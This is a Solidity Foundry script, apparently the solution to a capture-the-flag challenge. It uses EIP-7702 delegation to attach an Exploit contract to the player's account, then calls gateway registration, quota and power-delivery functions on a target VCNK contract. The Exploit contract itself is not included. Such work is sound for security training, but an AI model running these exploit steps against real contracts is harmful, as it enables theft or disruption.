// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {Script, console2} from "forge-std/Script.sol";
import {VCNK}    from "src/VCNK.sol";
import {Exploit} from "src/Exploit.sol";

contract ExploitScript is Script {
    function run() external {
        // addresses and private key (EOA with no initial contract code)
        uint256 PLAYER_PVK = vm.envUint("PLAYER_PVK");
        address PLAYER_ADDR = vm.addr(PLAYER_PVK);
        address TARGET = vm.envAddress("TARGET_ADDR");

        // exploit contract to delegate execution to
        Exploit exploit = new Exploit();
        console2.log("exploit deployed:", address(exploit));

        vm.startBroadcast(PLAYER_PVK);

        // player signs and attaches the delegation contract to their address
        vm.signAndAttachDelegation(address(exploit), PLAYER_PVK);
        console2.log("signing and attaching delegation contract to player account:", PLAYER_ADDR);
        
        // verify that player account now behaves as a contract
        bytes memory code = address(PLAYER_ADDR).code;
        require(code.length > 0, "no code written to player account");
        console2.log("Player account now has code:", PLAYER_ADDR);
        
        VCNK target = VCNK(TARGET);
        target.registerGateway{value: 20 ether}(PLAYER_ADDR);
        target.requestQuotaIncrease{value: 10 ether}(PLAYER_ADDR);
        target.requestPowerDelivery(10 ether, PLAYER_ADDR);

        vm.stopBroadcast();

        // verify CU status
        (uint8 status,,,) = target.controlUnit();
        console2.log("kernel status:", status);
        //asserteq
    }
}
